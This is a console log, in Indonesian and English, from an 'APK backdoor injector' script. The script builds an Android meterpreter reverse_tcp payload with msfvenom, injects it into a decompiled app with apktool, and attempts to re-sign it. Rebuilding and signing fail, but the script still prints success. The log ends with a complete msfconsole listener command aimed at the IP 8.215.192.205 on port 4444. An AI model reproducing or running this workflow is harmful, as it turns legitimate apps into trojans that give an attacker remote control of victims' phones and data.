=== APK BACKDOOR INJECTOR ===
LHOST: 8.215.192.205
LPORT: 4444
Log File: apk_mod_20250408_095643.log
[*] Memvalidasi environment...
[*] Mengecek koneksi ke 8.215.192.205:4444...
nc: connect to 8.215.192.205 port 4444 (tcp) failed: Connection refused
[!] Peringatan: Tidak bisa terkoneksi ke 8.215.192.205:4444
/usr/bin/zipalign
/usr/bin/keytool
/usr/bin/jarsigner
/usr/bin/msfvenom
/usr/bin/apktool
[*] Menyiapkan keystore...
Generating 4,096 bit RSA key pair and self-signed certificate (SHA384withRSA) with a validity of 10,000 days
	for: CN=Android Debug, O=Android, C=US
[Storing /root/.apk_tools/debug.keystore]
keytool error: java.io.FileNotFoundException: /root/.apk_tools/debug.keystore (No such file or directory)
java.io.FileNotFoundException: /root/.apk_tools/debug.keystore (No such file or directory)
	at java.base/java.io.FileOutputStream.open0(Native Method)
	at java.base/java.io.FileOutputStream.open(FileOutputStream.java:289)
	at java.base/java.io.FileOutputStream.<init>(FileOutputStream.java:230)
	at java.base/java.io.FileOutputStream.<init>(FileOutputStream.java:118)
	at java.base/sun.security.tools.keytool.Main.doCommands(Main.java:1372)
	at java.base/sun.security.tools.keytool.Main.run(Main.java:419)
	at java.base/sun.security.tools.keytool.Main.main(Main.java:412)
[*] Memeriksa proteksi APK...
[*] Menghapus signature lama...
	zip warning: name not matched: META-INF/*.DSA
deleting: META-INF/IMPORTED.SF
deleting: META-INF/IMPORTED.RSA
[!] APK mengandung native library (.so)
[*] Menyuntikkan payload...
[-] No platform was selected, choosing Msf::Module::Platform::Android from the payload
[-] No arch selected, selecting arch: dalvik from the payload
No encoder specified, outputting raw payload
Payload size: 10232 bytes
Saved as: /root/bacdoor-apk/apk_work_9RYqS3/payload.apk
I: Using Apktool 2.7.0-dirty on original.apk
I: Loading resource table...
I: Decoding AndroidManifest.xml with resources...
I: Loading resource table from file: /root/.local/share/apktool/framework/1.apk
I: Regular manifest package...
I: Decoding file-resources...
I: Decoding values */* XMLs...
I: Baksmaling classes.dex...
I: Copying assets and libs...
I: Copying unknown files...
I: Copying original files...
I: Copying META-INF/services directory
I: Using Apktool 2.7.0-dirty on payload.apk
I: Loading resource table...
I: Decoding AndroidManifest.xml with resources...
I: Loading resource table from file: /root/.local/share/apktool/framework/1.apk
I: Regular manifest package...
I: Decoding file-resources...
I: Decoding values */* XMLs...
I: Baksmaling classes.dex...
I: Copying assets and libs...
I: Copying unknown files...
I: Copying original files...
[*] Membangun APK...
I: Using Apktool 2.7.0-dirty
I: Checking whether sources has changed...
I: Smaling smali folder into classes.dex...
I: Checking whether resources has changed...
I: Building resources...
W: aapt: brut.common.BrutException: brut.common.BrutException: Could not extract resource: /prebuilt/linux/aapt_64 (defaulting to $PATH binary)
W: First type is not attr!
W: 04-08 09:57:34.648 270332 270332 F aapt    : First type is not attr!
brut.androlib.AndrolibException: brut.common.BrutException: could not exec (exit code = 134): [aapt, p, --min-sdk-version, 26, --target-sdk-version, 35, --version-code, 508900434, --version-name, 455.0.0.0.48, --no-version-vectors, -F, /tmp/APKTOOL12770569453896090573.tmp, -0, resources.arsc, -0, assets/mc_query_hash.bin, -0, assets/native_deps.txt, -0, assets/app_modules/contents/baseline_profiles_12_plus.json, -0, assets/app_modules/contents/baseline_profiles_9_11.json, -0, assets/app_modules/contents/s_blokscamera_heroplayer.json, -0, assets/app_modules/contents/s_blokscamera_heroplayer_rtc.json, -0, assets/app_modules/contents/s_boost_mediastreaming.json, -0, assets/app_modules/contents/s_fizz_mediastreaming.json, -0, assets/app_modules/contents/s_mediastreaming_msys_profilo_rtc.json, -0, assets/app_modules/contents/s_mediastreaming_msysinfra.json, -0, assets/lib/libs.spk.xz, -0, assets/secondary-program-dex-jars/metadata.txt, -0, assets/secondary-program-dex-jars/store-0.dex.spo, -0, png, -0, res/drawable/data_saver_loading, -0, arsc, -I, /root/.local/share/apktool/framework/1.apk, -S, /root/bacdoor-apk/apk_work_9RYqS3/original/res, -M, /root/bacdoor-apk/apk_work_9RYqS3/original/AndroidManifest.xml]
jarsigner error: java.lang.RuntimeException: keystore load: /root/.apk_tools/debug.keystore (No such file or directory)
Unable to open '/root/bacdoor-apk/apk_work_9RYqS3/unsigned.apk' as zip archive
[+] Selesai! APK termodifikasi: original_injected.apk
[*] Untuk menjalankan listener, gunakan perintah berikut:
msfconsole -q -x 'use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST 8.215.192.205; set LPORT 4444; set ExitOnSession false; run'
